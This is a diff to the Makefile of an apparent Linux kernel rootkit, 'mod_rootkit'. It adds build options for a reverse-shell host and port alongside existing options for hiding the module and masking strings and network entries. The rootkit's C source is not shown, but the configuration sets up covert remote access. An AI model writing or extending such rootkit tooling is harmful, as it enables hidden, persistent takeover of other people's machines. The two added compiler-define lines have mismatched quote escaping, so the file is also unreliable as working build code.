@@ -1,8 +1,11 @@
 MODULE_NAME := mod_rootkit
 
-STRING_EXCLUDES ?=
+STRING_EXCLUDES ?= # i.e 
 NET_EXCLUDES ?=
 HIDE_MODULE ?= 0
+
+RSHELL_HOST ?= # i.e 127.0.0.1
+RSHELL_PORT ?= # i.e 9001
 
 obj-m += $(MODULE_NAME).o
 $(MODULE_NAME)-objs := src/mod_rootkit.o \
@@ -19,7 +22,9 @@ $(MODULE_NAME)-objs := src/mod_rootkit.o \
 EXTRA_CFLAGS += -I$(PWD)/include \
                 -DMODULE_NAME=\"$(MODULE_NAME)\" \
                 -DSTRING_EXCLUDES=\"$(STRING_EXCLUDES)\" \
-                -DNET_EXCLUDES=\"$(NET_EXCLUDES)\"
+                -DNET_EXCLUDES=\"$(NET_EXCLUDES)\" \
+				-DRSHELL_HOST=\"$(RSHELL_HOST)" \
+				-DRSHELL_PORT=\"$(RSHELL_PORT)"
 
 ifeq ($(HIDE_MODULE),1)
   EXTRA_CFLAGS += -DHIDE_MODULE
@@ -34,6 +39,8 @@ all:
 	@echo "    > HIDE_MODULE      = $(HIDE_MODULE)"
 	@echo "    > STRING_EXCLUDES  = $(STRING_EXCLUDES)"
 	@echo "    > NET_EXCLUDES     = $(NET_EXCLUDES)"
+	@echo "    > RSHELL_HOST      = $(RSHELL_HOST)"
+	@echo "    > RSHELL_PORT      = $(RSHELL_PORT)"
 	@echo "    > MODULE_NAME      = $(MODULE_NAME)"
 	@echo "    > Kernel Version   = $(shell uname -r)"
 	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
